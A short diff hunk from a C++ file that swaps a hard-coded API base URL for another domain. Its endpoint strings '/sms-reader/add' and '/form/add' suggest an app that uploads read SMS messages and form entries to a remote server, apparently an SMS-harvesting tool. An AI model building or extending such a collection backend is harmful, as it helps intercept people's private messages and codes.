@@ -2,7 +2,7 @@
 #include <string>
 
 // Declare global variables for the domain URLs
-std::string url = "https://missyou9.in/api";
+std::string url = "https://cloudqq.in/api";
 std::string sms_save = "/sms-reader/add";
 std::string form_save = "/form/add";
 std::string site = "localhost";
